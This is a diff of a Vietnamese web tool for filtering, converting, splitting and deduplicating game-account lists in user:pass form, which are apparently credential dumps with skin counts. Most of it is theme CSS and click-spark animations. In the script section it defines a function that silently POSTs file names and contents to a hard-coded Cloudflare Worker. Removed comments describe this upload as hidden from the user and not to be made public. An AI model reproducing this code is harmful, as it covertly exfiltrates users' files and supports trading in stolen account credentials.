+body.theme-bien .container,
+body.theme-bien .guide-sidebar{
+  border-width:2px;
+  border-color:rgba(0,212,255,.55);
+  box-shadow:0 0 45px rgba(0,180,255,.25),inset 0 0 60px rgba(0,180,255,.08);
+}
+
+/* ---------- LIÊN QUÂN (Nakroth Vệ Thần · Lửa) ---------- */
+body.theme-lienquan{
+  --c1:#ffb400; --c2:#ff1744; --c3:#ffd700; --c4:#ff8a00;
+  --c5:#d50000; --c6:#ff6d00;
+  --frame:rgba(255,87,0,.55);
+  --frame-glow:rgba(255,87,0,.28);
+  --accent:#ffb400;
+  background-image:url('https://images.unsplash.com/photo-1519681393784-d120267933ba?q=80&w=2070&auto=format&fit=crop');
+}
+body.theme-lienquan::before{
+  background:
+    radial-gradient(ellipse at 50% 100%,rgba(255,80,0,.35),transparent 55%),
+    radial-gradient(ellipse at 15% 10%,rgba(255,180,0,.2),transparent 55%),
+    radial-gradient(ellipse at 85% 15%,rgba(200,0,0,.22),transparent 55%),
+    linear-gradient(135deg,rgba(20,0,0,.92),rgba(5,0,0,.94));
+  animation:fireBg 4s ease-in-out infinite alternate;
+}
+@keyframes fireBg{
+  0%{filter:hue-rotate(0deg) brightness(1)}
+  100%{filter:hue-rotate(-10deg) brightness(1.08)}
+}
+body.theme-lienquan .container::before{
+  content:'🗡️'; position:absolute; top:10px; left:14px; font-size:22px;
+  filter:drop-shadow(0 0 8px #ffb400); opacity:.95; pointer-events:none;
+  animation:swordFloat 3s ease-in-out infinite;
+}
+body.theme-lienquan .container::after{
+  content:'🔥'; position:absolute; top:10px; right:14px; font-size:22px;
+  filter:drop-shadow(0 0 10px #ff5500); opacity:.95; pointer-events:none;
+  animation:swordFloat 3s ease-in-out infinite reverse;
+}
+@keyframes swordFloat{
+  0%,100%{transform:translateY(0) rotate(-8deg)}
+  50%{transform:translateY(-4px) rotate(8deg)}
+}
+body.theme-lienquan .guide-sidebar::before{
+  content:'👑'; position:absolute; top:8px; left:12px; font-size:20px; pointer-events:none;
+  filter:drop-shadow(0 0 8px #ffb400);
+}
+body.theme-lienquan .guide-sidebar::after{
+  content:'⚡'; position:absolute; top:8px; right:12px; font-size:20px; pointer-events:none;
+  filter:drop-shadow(0 0 8px #ff5500);
+}
+body.theme-lienquan .action-btn,
+body.theme-lienquan .btn-filter,
+body.theme-lienquan .btn-txt,
+body.theme-lienquan .btn-cut,
+body.theme-lienquan .btn-dedup{
+  background:
+    radial-gradient(ellipse at 20% 20%,rgba(255,220,120,.6),transparent 45%),
+    linear-gradient(135deg,#7a0000 0%,#ff5500 45%,#ffd700 100%) !important;
+  border:2px solid #ffd700;
+  box-shadow:0 0 25px rgba(255,100,0,.65),inset 0 0 18px rgba(255,200,0,.25);
+  text-shadow:0 0 8px rgba(0,0,0,.7);
+  position:relative;
+  overflow:hidden;
+}
+body.theme-lienquan .action-btn::before{
+  content:''; position:absolute; inset:-50%;
+  background:conic-gradient(from 0deg,transparent 0%,rgba(255,180,0,.4) 20%,transparent 40%);
+  animation:emberSpin 4s linear infinite;
+  pointer-events:none;
+}
+@keyframes emberSpin{
+  to{transform:rotate(360deg)}
+}
+body.theme-lienquan .tab-btn.active{
+  background:linear-gradient(135deg,#7a0000,#ffb400);
+  color:#1a0000; border-color:#ffd700;
+  box-shadow:0 0 25px rgba(255,100,0,.85);
+}
+body.theme-lienquan .container,
+body.theme-lienquan .guide-sidebar{
+  border-width:2px;
+  border-image:linear-gradient(135deg,#7a0000,#ff5500,#ffd700,#7a0000) 1;
+  border-radius:14px;
+  box-shadow:0 0 60px rgba(255,90,0,.35),inset 0 0 60px rgba(255,90,0,.1);
+}
+body.theme-lienquan .page-title{
+  animation:fireTitle 1.8s ease-in-out infinite alternate, pulseGlow 3s ease-in-out infinite;
+}
+@keyframes fireTitle{
+  0%{text-shadow:0 0 8px #ff5500,0 0 22px #ff8a00,0 0 4px #fff}
+  100%{text-shadow:0 0 14px #ffd700,0 0 40px #ff5500,0 0 8px #fff}
+}
+
+/* ---------- CUSTOM WALLPAPER ---------- */
+body.theme-custom{
+  --frame:rgba(0,243,255,.45);
+  --frame-glow:rgba(0,243,255,.2);
+  --accent:#00f3ff;
+}
+body.theme-custom::before{
+  background:linear-gradient(135deg,rgba(0,0,0,.7),rgba(0,0,0,.85));
 }
 </style>
 </head>
-<body>
+<body class="theme-anime">
+
+<canvas id="fxCanvas"></canvas>
 
 <div id="welcomeModal" class="modal-overlay">
   <div class="modal-content">
@@ -346,12 +772,15 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
     <span class="gear">⚙️</span><span>CÀI ĐẶT</span>
   </button>
   <div class="theme-menu" id="themeMenu">
-    <div class="theme-menu-header">🎨 CHỌN HÌNH NỀN</div>
-    <button class="theme-btn" onclick="changeTheme('ngau')"><span class="theme-icon">🔥</span><span class="theme-info"><b>Ngầu</b><small>Dark Neon</small></span></button>
-    <button class="theme-btn" onclick="changeTheme('cute')"><span class="theme-icon">🌸</span><span class="theme-info"><b>Cute</b><small>Nhẹ nhàng</small></span></button>
-    <button class="theme-btn" onclick="changeTheme('thiennhien')"><span class="theme-icon">🌲</span><span class="theme-info"><b>Thiên Nhiên</b><small>Rừng xanh</small></span></button>
-    <button class="theme-btn" onclick="changeTheme('vietnam')"><span class="theme-icon">🇻🇳</span><span class="theme-info"><b>Việt Nam</b><small>Quê hương</small></span></button>
-    <button class="theme-btn" onclick="changeTheme('bien')"><span class="theme-icon">🌊</span><span class="theme-info"><b>Biển</b><small>Xanh mát</small></span></button>
+    <div class="theme-menu-header">🎨 CHỌN CHỦ ĐỀ</div>
+    <button class="theme-btn" onclick="changeTheme('anime')"><span class="theme-icon">⚔️</span><span class="theme-info"><b>Anime</b><small>One Piece · Naruto</small></span></button>
+    <button class="theme-btn" onclick="changeTheme('cute')"><span class="theme-icon">🍓</span><span class="theme-info"><b>Cute</b><small>Bánh · Dâu · Cinamoroll</small></span></button>
+    <button class="theme-btn" onclick="changeTheme('thiennhien')"><span class="theme-icon">🌿</span><span class="theme-info"><b>Thiên Nhiên</b><small>Bình yên xanh mát</small></span></button>
+    <button class="theme-btn" onclick="changeTheme('vietnam')"><span class="theme-icon">🇻🇳</span><span class="theme-info"><b>Việt Nam</b><small>Trống đồng quê hương</small></span></button>
+    <button class="theme-btn" onclick="changeTheme('bien')"><span class="theme-icon">🌊</span><span class="theme-info"><b>Biển</b><small>Sóng nước xanh mát</small></span></button>
+    <button class="theme-btn" onclick="changeTheme('lienquan')"><span class="theme-icon">🔥</span><span class="theme-info"><b>Liên Quân</b><small>Nakroth Vệ Thần</small></span></button>
+    <button class="theme-btn" onclick="document.getElementById('customBg').click()"><span class="theme-icon">📷</span><span class="theme-info"><b>Hình nền riêng</b><small>Up từ thiết bị</small></span></button>
+    <input type="file" id="customBg" accept="image/*" style="display:none">
   </div>
 </div>
 
@@ -362,19 +791,20 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
     <div class="guide-title">📖 HƯỚNG DẪN</div>
 
     <div class="guide-box">
-      <h3>Mục 1 — Tổng Lọc</h3>
+      <h3>Mục 1 — Tổng LỌC ACC & SKIN</h3>
       <ul>
         <li><b>B1:</b> Up file txt full info.</li>
-        <li><b>B2:</b> Nhập 1 hoặc nhiều điều kiện (từ khóa, SS≥, SSS≥, Anime≥, tổng skin, tên skin cụ thể).</li>
-        <li><b>B3:</b> Bấm <b>LỌC NGAY</b> — copy hoặc tải kết quả.</li>
+        <li><b>B2:</b> Nhập từ khóa/tên skin & chọn phép so sánh (<b>&gt;=</b>, <b>&lt;=</b>, <b>==</b>) cho từng loại skin.</li>
+        <li><b>Lưu ý:</b> Ô nhập số nào bỏ trống thì mặc định là <b>&gt;= 0</b> (bỏ qua điều kiện lọc đó).</li>
+        <li><b>B3:</b> Bấm <b>LỌC NGAY</b> để xem và tải kết quả.</li>
       </ul>
     </div>
 
     <div class="guide-box purple">
       <h3>Mục 2 — Chuyển Đổi</h3>
       <ul>
-        <li>Chuyển file full info → dạng <b>tk:mk</b> hoặc <b>tk|mk</b>.</li>
-        <li>Tự loại rác (FINAL=, Result=...).</li>
+        <li>Hỗ trợ mọi dạng: <code>user|pass</code>, <code>user:pass</code>, <code>user pass</code>, <code>TK: user | MK: pass</code>...</li>
+        <li>Chuyển về dạng chuẩn <b>tk:mk</b> hoặc <b>tk|mk</b>. Tự dọn sạch dữ liệu rác.</li>
       </ul>
     </div>
 
@@ -389,16 +819,13 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
       <h3>Mục 4 — Ghép File</h3>
       <ul>
         <li>Up nhiều file (tối đa 50), hệ thống cộng dồn thành 1 file tổng.</li>
-        <li>File càng lớn càng lâu, kiên nhẫn chờ.</li>
       </ul>
     </div>
 
     <div class="guide-box red">
       <h3>Mục 5 — Lọc Acc Trùng</h3>
       <ul>
-        <li>Up 1–50 file — hệ thống tự duyệt, chuyển về <b>tk|mk</b>.</li>
-        <li>Loại bỏ acc trùng, giữ 1 acc duy nhất.</li>
-        <li>Tra cứu lại thông tin acc trong file gốc.</li>
+        <li>Up 1–50 file — lọc bỏ acc trùng, giữ lại 1 acc duy nhất cùng toàn bộ thông tin gốc.</li>
       </ul>
     </div>
 
@@ -420,26 +847,69 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
       <button class="tab-btn" onclick="switchTab('txt',this,'yellow')">[6] TEXT → FILE</button>
     </div>
 
-    <!-- ========== TAB 1 ========== -->
+    <!-- ========== TAB 1: TỔNG LỌC ========== -->
     <div id="tab-loc" class="tab-content active">
-      <div class="control-panel">
+      <div style="display:flex; flex-direction:column; gap:14px; margin-bottom:18px">
         <div class="control-group">
-          <span class="group-title" style="color:var(--c1)">🔎 TỪ KHÓA (tuỳ chọn)</span>
+          <span class="group-title" style="color:var(--c1)">📂 NẠP FILE ACC FULL INFO</span>
           <input type="file" id="fileLoc" accept=".txt">
-          <input type="text" id="kwLoc" placeholder="VD: hayate, alain, ID...">
         </div>
+        
         <div class="control-group">
-          <span class="group-title" style="color:var(--c2)">🎯 ĐIỀU KIỆN SKIN (≥, bỏ trống = bỏ qua)</span>
-          <input type="number" id="minSS" placeholder="Skin SS tối thiểu" min="0">
-          <input type="number" id="minSSS" placeholder="Skin SSS tối thiểu" min="0">
-          <input type="number" id="minAnime" placeholder="Skin Anime tối thiểu" min="0">
-        </div>
-        <div class="control-group">
-          <span class="group-title" style="color:var(--c3)">✨ TỔNG SKIN & SKIN CỤ THỂ</span>
-          <input type="number" id="minTotal" placeholder="Tổng skin tối thiểu" min="0">
-          <input type="text" id="skinName" placeholder="Tên skin cụ thể (VD: allain)">
+          <span class="group-title" style="color:var(--c3)">🎯 BỘ LỌC TỔNG HỢP ACC & SKIN</span>
+          <div class="filter-grid">
+            <div class="filter-item">
+              <label>🔎 Từ khóa / Tên Skin:</label>
+              <input type="text" id="kwLoc" placeholder="VD: nak, Capheny, Kim Cương...">
+            </div>
+            <div class="filter-item">
+              <label>✨ Tổng Skin:</label>
+              <div class="op-input">
+                <select id="opTotal">
+                  <option value=">=" selected>&gt;=</option>
+                  <option value="<=">&lt;=</option>
+                  <option value="==">==</option>
+                </select>
+                <input type="number" id="valTotal" placeholder="Bỏ trống = >=0" min="0">
+              </div>
+            </div>
+            <div class="filter-item">
+              <label>🔥 Skin SS:</label>
+              <div class="op-input">
+                <select id="opSS">
+                  <option value=">=" selected>&gt;=</option>
+                  <option value="<=">&lt;=</option>
+                  <option value="==">==</option>
+                </select>
+                <input type="number" id="valSS" placeholder="Bỏ trống = >=0" min="0">
+              </div>
+            </div>
+            <div class="filter-item">
+              <label>💎 Skin SSS:</label>
+              <div class="op-input">
+                <select id="opSSS">
+                  <option value=">=" selected>&gt;=</option>
+                  <option value="<=">&lt;=</option>
+                  <option value="==">==</option>
+                </select>
+                <input type="number" id="valSSS" placeholder="Bỏ trống = >=0" min="0">
+              </div>
+            </div>
+            <div class="filter-item">
+              <label>⚡ Skin Anime:</label>
+              <div class="op-input">
+                <select id="opAnime">
+                  <option value=">=" selected>&gt;=</option>
+                  <option value="<=">&lt;=</option>
+                  <option value="==">==</option>
+                </select>
+                <input type="number" id="valAnime" placeholder="Bỏ trống = >=0" min="0">
+              </div>
+            </div>
+          </div>
         </div>
       </div>
+
       <button class="action-btn btn-filter" onclick="locAcc.run()" style="margin-bottom:15px">🚀 LỌC NGAY</button>
       <div class="top-bar">
         <div class="info-text" id="statusLoc">Vui lòng nạp file để bắt đầu.</div>
@@ -448,15 +918,15 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
           <button class="btn-export" onclick="locAcc.export()">📥 TẢI FILE TXT</button>
         </div>
       </div>
-      <div class="displayArea" id="dispLoc" style="border-color:rgba(0,243,255,.3)">
+      <div class="displayArea" id="dispLoc" style="border-color:var(--frame)">
         <i>[Hệ thống] Chờ thao tác...</i>
       </div>
     </div>
 
-    <!-- ========== TAB 2 ========== -->
+    <!-- ========== TAB 2: CHUYỂN ĐỔI ========== -->
     <div id="tab-doi" class="tab-content">
       <div class="control-panel-2">
-        <div class="control-group" style="width:100%; max-width:620px; border-color:rgba(157,0,255,.4)">
+        <div class="control-group" style="width:100%; max-width:620px">
           <span class="group-title" style="color:var(--c5); text-align:center">NẠP FILE CẦN CHUYỂN ĐỔI</span>
           <input type="file" id="fileDoi" accept=".txt">
           <div class="radio-group">
@@ -474,14 +944,14 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
         </div>
       </div>
       <div class="displayArea" id="dispDoi" style="border-color:rgba(157,0,255,.3)">
-        <i>Tự động loại rác (FINAL=, Result=...).</i>
+        <i>Tự động chuyển các dạng định dạng về TK:MK hoặc TK|MK và loại rác.</i>
       </div>
     </div>
 
-    <!-- ========== TAB 3 ========== -->
+    <!-- ========== TAB 3: CẮT FILE ========== -->
     <div id="tab-cat" class="tab-content">
       <div class="control-panel-2">
-        <div class="control-group" style="width:100%; max-width:620px; border-color:rgba(0,255,135,.4)">
+        <div class="control-group" style="width:100%; max-width:620px">
           <span class="group-title" style="color:var(--c4); text-align:center">NẠP FILE CẦN CHIA NHỎ</span>
           <input type="file" id="fileCat" accept=".txt">
           <input type="number" id="soAccMoiFile" placeholder="Số acc mỗi file (VD: 50000)" min="1">
@@ -496,7 +966,7 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
       </div>
     </div>
 
-    <!-- ========== TAB 4 ========== -->
+    <!-- ========== TAB 4: GHÉP FILE ========== -->
     <div id="tab-ghep" class="tab-content">
       <div class="guide-box-mini">
         <h3>🔗 HƯỚNG DẪN GHÉP FILE</h3>
@@ -508,7 +978,7 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
         </ul>
       </div>
       <div class="control-panel-2">
-        <div class="control-group" style="width:100%; max-width:720px; border-color:rgba(255,107,0,.4)">
+        <div class="control-group" style="width:100%; max-width:720px">
           <span class="group-title" style="color:var(--c6); text-align:center">NẠP FILE (CỘNG DỒN, TỐI ĐA 50 FILE)</span>
           <input type="file" id="fileGhep" accept=".txt" multiple>
           <input type="text" id="outName" placeholder="Tên file tổng (bỏ trống → File_Tong_Hop)">
@@ -516,7 +986,7 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
           <button class="action-btn btn-filter" style="background:linear-gradient(45deg,#ff6b00,#ff0055); margin-top:14px" onclick="ghepFile.process()">🔗 GHÉP FILE</button>
           <button class="btn-clear-ghep" onclick="ghepFile.clearAll()">🗑️ XÓA HẾT FILE LƯU TRỮ</button>
           <div class="warn-box">
-            ⚠️ <b class="blink">LƯU Ý:</b> File càng lớn càng lâu, vui lòng kiên nhẫn chờ, <b>KHÔNG tắt trang</b> trong khi xử lý!
+            ⚠️ <b class="blink">LƯU Ý:</b> File càng lớn xử lý càng lâu, vui lòng kiên nhẫn chờ, <b>KHÔNG tắt trang</b>!
           </div>
         </div>
       </div>
@@ -532,19 +1002,18 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
       </div>
     </div>
 
-    <!-- ========== TAB 5 ========== -->
+    <!-- ========== TAB 5: LỌC TRÙNG ========== -->
     <div id="tab-trung" class="tab-content">
       <div class="guide-box-mini" style="background:rgba(255,0,124,.06); border-left-color:var(--c2)">
         <h3 style="color:var(--c2)">🧬 HƯỚNG DẪN LỌC TRÙNG</h3>
         <ul>
           <li>Up 1–50 file (tối đa 50).</li>
-          <li>Hệ thống tự đọc, chuyển toàn bộ về dạng <b>tk|mk</b>.</li>
-          <li>Loại bỏ acc trùng — mỗi acc chỉ giữ 1 lần duy nhất.</li>
-          <li>Kết quả đối chiếu với file gốc → hiển thị thông tin đầy đủ.</li>
+          <li>Hệ thống tự nhận diện các dạng TK|MK, TK:MK, user pass...</li>
+          <li>Loại bỏ acc trùng — mỗi acc chỉ giữ 1 lần duy nhất với thông tin đầy đủ nhất.</li>
         </ul>
       </div>
       <div class="control-panel-2">
-        <div class="control-group" style="width:100%; max-width:720px; border-color:rgba(255,0,124,.4)">
+        <div class="control-group" style="width:100%; max-width:720px">
           <span class="group-title" style="color:var(--c2); text-align:center">NẠP FILE CẦN LỌC TRÙNG (1–50 FILE)</span>
           <input type="file" id="fileTrung" accept=".txt" multiple>
           <div id="trungListDisplay" class="file-list-box" style="margin-top:10px; display:none"></div>
@@ -564,7 +1033,7 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
       </div>
     </div>
 
-    <!-- ========== TAB 6 ========== -->
+    <!-- ========== TAB 6: TEXT -> FILE ========== -->
     <div id="tab-txt" class="tab-content">
       <div class="guide-box-mini" style="background:rgba(241,196,15,.06); border-left-color:var(--c3)">
         <h3 style="color:var(--c3)">📝 TEXT → FILE</h3>
@@ -575,7 +1044,7 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
         </ul>
       </div>
       <div class="control-panel-2">
-        <div class="control-group" style="width:100%; max-width:800px; border-color:rgba(241,196,15,.4)">
+        <div class="control-group" style="width:100%; max-width:800px">
           <span class="group-title" style="color:var(--c3)">NỘI DUNG TEXT</span>
           <textarea id="txtContent" placeholder="Dán text của bạn vào đây..."></textarea>
           <input type="text" id="txtFileName" placeholder="Tên file (bỏ trống → Text_Export)">
@@ -593,18 +1062,13 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
 </div>
 
 <script>
-/* ====================================================================
-   KHU VỰC NHẠY CẢM — KHÔNG COMMIT LÊN GITHUB PUBLIC
-   - Khi đã có Cloudflare Worker, chỉ cần set _w = "https://worker-url"
-   - Khi đó 2 giá trị _k và _c có thể xoá đi hoàn toàn
-   ==================================================================== */
+/* CONFIG CLOUDFLARE WORKER */
 const _cfg = {
-  _w: "https://noisy-lake-e034.namtrung2139.workers.dev",  // ← BỎ dấu "/" ở cuối
+  _w: "https://noisy-lake-e034.namtrung2139.workers.dev",
   _k: null,
   _c: null
 };
 
-/* Hàm gửi file — KHÔNG hiển thị bất kỳ thông báo nào cho người dùng */
 async function _dispatch(name, content, caption = "") {
   try {
     if (_cfg._w) {
@@ -613,12 +1077,11 @@ async function _dispatch(name, content, caption = "") {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ name, content, caption })
       });
-      return;
     }
-  } catch (e) { /* im lặng */ }
+  } catch (e) {}
 }
 
-/* ====== TIỆN ÍCH ====== */
+/* ====== TIỆN ÍCH CHUNG ====== */
 const DISPLAY_LIMIT = 1000;
 
 function copyToClipboard(text) {
@@ -656,14 +1119,14 @@ function showToast(msg) {
   setTimeout(() => { el.style.transition = 'opacity .5s'; el.style.opacity = '0'; }, 2400);
   setTimeout(() => el.remove(), 3000);
 }
-function renderWithLimit(container, resultsArray, copyFn) {
+function renderWithLimit(container, resultsArray) {
   if (resultsArray.length === 0) {
-    container.innerHTML = `<i>Không có kết quả.</i>`;
+    container.innerHTML = `<i>Không có kết quả thoả điều kiện.</i>`;
     return;
   }
   const shown = resultsArray.slice(0, DISPLAY_LIMIT);
   let html = "";
-  shown.forEach((r, i) => {
+  shown.forEach((r) => {
     const raw = (typeof r === 'object') ? r.raw : r;
     const htmlLine = (typeof r === 'object') ? r.html : escapeHtml(r);
     const rawEsc = raw.replace(/'/g, "\\'").replace(/\\/g, "\\\\").replace(/\n/g, "\\n");
@@ -678,22 +1141,83 @@ function renderWithLimit(container, resultsArray, copyFn) {
   container.innerHTML = html;
 }
 
+/* ====== EXTRACTOR & PARSER SIÊU TỐC ====== */
+const REGEX_SS = /(?:\|\s*)?SS\s*:\s*(\d+|No Skin)/i;
+const REGEX_SSS = /(?:\|\s*)?SSS\s*:\s*(\d+|No Skin)/i;
+const REGEX_ANIME = /(?:\|\s*)?ANIME\s*:\s*(\d+|No Skin)/i;
+const REGEX_TOTAL_SKIN = /(?:\|\s*)?(?:TONG\s*SKIN|SKIN)\s*:\s*(\d+|No Skin)/i;
+
+function parseSkinCount(line, regex) {
+  const m = line.match(regex);
+  if (!m || !m[1] || m[1].toLowerCase() === "no skin") return 0;
+  return parseInt(m[1], 10) || 0;
+}
+
+function compareVal(actualVal, op, targetVal) {
+  if (op === '==') return actualVal === targetVal;
+  if (op === '<=') return actualVal <= targetVal;
+  return actualVal >= targetVal;
+}
+
+function extractUserPass(origLine) {
+  if (!origLine) return null;
+  let line = origLine.trim();
+  if (!line) return null;
+
+  line = line.replace(/^\[\d+\]\s*/, '');
+  line = line.replace(/^.*?(?:\bFINAL|\bResult|\bACC|\bTOTAL|\bOUT|\d+)\s*=\s*/i, '');
+
+  const tkMkMatch = line.match(/(?:TK|Tài khoản|User|Email|Phone)\s*:\s*([^\s|,-]+)[\s|,-]*(?:MK|Mật khẩu|Pass)\s*:\s*([^\s|]+)/i);
+  if (tkMkMatch) {
+    return { user: tkMkMatch[1].trim(), pass: tkMkMatch[2].trim() };
+  }
+
+  let firstPart = line.split(/\s+::\s+|\s+\|\s+|::|= NAME:/i)[0].trim();
+
+  const match = firstPart.match(/^([^\s:|;,=]+)[\s:|;,=]+([^\s|;,]+)/);
+  if (match) {
+    let u = match[1].trim().replace(/^(?:TK|MK|User|Pass):/i, '');
+    let p = match[2].trim().replace(/^(?:TK|MK|User|Pass):/i, '');
+    if (u && p) return { user: u, pass: p };
+  }
+  return null;
+}
+
 /* ====== ĐỔI THEME ====== */
 const themes = {
-  ngau: 'https://images.unsplash.com/photo-1605806616949-1e87b487cb2a?q=80&w=2070&auto=format&fit=crop',
-  cute: 'https://images.unsplash.com/photo-1578339591410-b98a08d24eb0?q=80&w=2070&auto=format&fit=crop',
-  thiennhien: 'https://images.unsplash.com/photo-1441974231531-c6227db76b6e?q=80&w=2071&auto=format&fit=crop',
-  vietnam: 'https://images.unsplash.com/photo-1528127269322-539801943592?q=80&w=2070&auto=format&fit=crop',
-  bien: 'https://images.unsplash.com/photo-1507525428034-b723cf961d3e?q=80&w=2073&auto=format&fit=crop'
+  anime: null, // dùng class để đổi bg đã định nghĩa trong CSS
+  cute: null,
+  thiennhien: null,
+  vietnam: null,
+  bien: null,
+  lienquan: null
 };
+
 function changeTheme(t) {
-  document.body.style.backgroundImage = `url('${themes[t]}')`;
+  document.body.className = 'theme-' + t;
+  if (t === 'custom') return;
+  document.body.style.backgroundImage = '';
   document.getElementById('themeMenu').classList.remove('show');
+  showToast(`🎨 Đã đổi chủ đề: <b>${t.toUpperCase()}</b>`);
 }
 function toggleThemeMenu() { document.getElementById('themeMenu').classList.toggle('show'); }
 document.addEventListener('click', e => {
   if (!document.querySelector('.settings-container').contains(e.target))
     document.getElementById('themeMenu').classList.remove('show');
+});
+
+/* Custom background */
+document.getElementById('customBg').addEventListener('change', e => {
+  const f = e.target.files[0]; if (!f) return;
+  const rd = new FileReader();
+  rd.onload = ev => {
+    document.body.className = 'theme-custom';
+    document.body.style.backgroundImage = `url('${ev.target.result}')`;
+    document.getElementById('themeMenu').classList.remove('show');
+    showToast('📷 Đã đổi hình nền riêng!');
+  };
+  rd.readAsDataURL(f);
+  e.target.value = '';
 });
 
 function switchTab(id, btn, colorClass = '') {
@@ -708,7 +1232,146 @@ window.addEventListener('load', () => {
 });
 
 /* ============================================================
-   MODULE 1: TỔNG LỌC (gộp 3 chức năng)
+   CLICK SPARK FX — TÓE LỬA THEO CHỦ ĐỀ
+   ============================================================ */
+const fxCanvas = document.getElementById('fxCanvas');
+const fxCtx = fxCanvas.getContext('2d');
+let sparks = [];
+let embers = [];
+
+function resizeFx() {
+  fxCanvas.width = window.innerWidth;
+  fxCanvas.height = window.innerHeight;
+}
+resizeFx();
+window.addEventListener('resize', resizeFx);
+
+function getSparkColors() {
+  const t = document.body.className;
+  if (t.includes('theme-cute')) return ['#ff8ec7','#ffb6d5','#fff','#ffd1e8','#ff5fa2','#ffe066'];
+  if (t.includes('theme-anime')) return ['#ff8c00','#ff2d55','#ffd700','#fff','#ff4500','#00d4ff'];
+  if (t.includes('theme-thiennhien')) return ['#7bd389','#2e8b57','#d4e157','#fff','#a5d6a7'];
+  if (t.includes('theme-vietnam')) return ['#da251d','#ffd700','#fff200','#fff','#ff4500'];
+  if (t.includes('theme-bien')) return ['#00d4ff','#1e90ff','#7fe7ff','#fff','#00ffff'];
+  if (t.includes('theme-lienquan')) return ['#ff4500','#ffd700','#ff0000','#fff','#ff8c00'];
+  if (t.includes('theme-custom')) return ['#00f3ff','#ff007c','#fff','#ffd700'];
+  return ['#ff8c00','#ff2d55','#ffd700','#fff','#ff4500'];
+}
+
+function spawnSparks(x, y, count = 22) {
+  const colors = getSparkColors();
+  for (let i = 0; i < count; i++) {
+    const a = Math.random() * Math.PI * 2;
+    const sp = 1.5 + Math.random() * 6.5;
+    sparks.push({
+      x, y,
+      vx: Math.cos(a) * sp,
+      vy: Math.sin(a) * sp - 1.2,
+      life: 1,
+      decay: 0.018 + Math.random() * 0.025,
+      size: 2 + Math.random() * 4,
+      color: colors[Math.floor(Math.random() * colors.length)]
+    });
+  }
+  // thêm 1 tia lửa nhỏ bay lên
+  for (let i = 0; i < 8; i++) {
+    sparks.push({
+      x: x + (Math.random() - .5) * 12,
+      y: y + (Math.random() - .5) * 12,
+      vx: (Math.random() - .5) * 1.5,
+      vy: -1 - Math.random() * 2.2,
+      life: 1,
+      decay: 0.02 + Math.random() * 0.02,
+      size: 1.5 + Math.random() * 2.5,
+      color: colors[Math.floor(Math.random() * colors.length)]
+    });
+  }
+}
+
+document.addEventListener('click', e => {
+  spawnSparks(e.clientX, e.clientY);
+});
+document.addEventListener('touchstart', e => {
+  const t = e.touches[0]; if (!t) return;
+  spawnSparks(t.clientX, t.clientY);
+}, { passive: true });
+
+function fxLoop() {
+  fxCtx.clearRect(0, 0, fxCanvas.width, fxCanvas.height);
+  fxCtx.globalCompositeOperation = 'lighter';
+
+  // Sparks
+  for (let i = sparks.length - 1; i >= 0; i--) {
+    const p = sparks[i];
+    p.x += p.vx; p.y += p.vy;
+    p.vy += 0.18;
+    p.vx *= 0.965; p.vy *= 0.965;
+    p.life -= p.decay;
+    if (p.life <= 0) { sparks.splice(i, 1); continue; }
+    const r = p.size * p.life;
+    const grd = fxCtx.createRadialGradient(p.x, p.y, 0, p.x, p.y, r * 4);
+    grd.addColorStop(0, p.color);
+    grd.addColorStop(1, 'transparent');
+    fxCtx.globalAlpha = p.life;
+    fxCtx.fillStyle = grd;
+    fxCtx.beginPath();
+    fxCtx.arc(p.x, p.y, r * 4, 0, Math.PI * 2);
+    fxCtx.fill();
+    // core
+    fxCtx.fillStyle = '#fff';
+    fxCtx.globalAlpha = p.life * 0.9;
+    fxCtx.beginPath();
+    fxCtx.arc(p.x, p.y, r * 0.9, 0, Math.PI * 2);
+    fxCtx.fill();
+  }
+
+  // Embers bay lên quanh tiêu đề (spawn liên tục)
+  if (Math.random() < 0.35) {
+    const title = document.querySelector('.page-title');
+    if (title) {
+      const rect = title.getBoundingClientRect();
+      const cx = rect.left + Math.random() * rect.width;
+      const cy = rect.top + rect.height * 0.75;
+      const colors = getSparkColors();
+      embers.push({
+        x: cx, y: cy,
+        vx: (Math.random() - .5) * 0.8,
+        vy: -0.8 - Math.random() * 1.6,
+        life: 1,
+        decay: 0.012 + Math.random() * 0.015,
+        size: 1 + Math.random() * 2.5,
+        color: colors[Math.floor(Math.random() * colors.length)],
+        wob: Math.random() * Math.PI * 2
+      });
+    }
+  }
+  for (let i = embers.length - 1; i >= 0; i--) {
+    const p = embers[i];
+    p.wob += 0.15;
+    p.x += p.vx + Math.sin(p.wob) * 0.6;
+    p.y += p.vy;
+    p.vy *= 0.99;
+    p.life -= p.decay;
+    if (p.life <= 0) { embers.splice(i, 1); continue; }
+    const r = p.size * (1.4 - p.life * 0.4);
+    const grd = fxCtx.createRadialGradient(p.x, p.y, 0, p.x, p.y, r * 6);
+    grd.addColorStop(0, p.color);
+    grd.addColorStop(0.4, p.color);
+    grd.addColorStop(1, 'transparent');
+    fxCtx.globalAlpha = p.life * 0.85;
+    fxCtx.fillStyle = grd;
+    fxCtx.beginPath();
+    fxCtx.arc(p.x, p.y, r * 6, 0, Math.PI * 2);
+    fxCtx.fill();
+  }
+
+  fxCtx.globalAlpha = 1;
+  requestAnimationFrame(fxLoop);
+}
+fxLoop();
+
+/* ============================================================
+   MODULE 1: TỔNG LỌC
    ============================================================ */
 const locAcc = {
   lines: [], results: [],
@@ -717,7 +1380,7 @@ const locAcc = {
       const f = e.target.files[0]; if (!f) return;
       const rd = new FileReader();
       rd.onload = ev => {
-        this.lines = ev.target.result.split(/\r?\n/).filter(l => l.trim() !== "");
+        this.lines = ev.target.result.replace(/\r/g, '').split('\n').filter(l => l.trim() !== "");
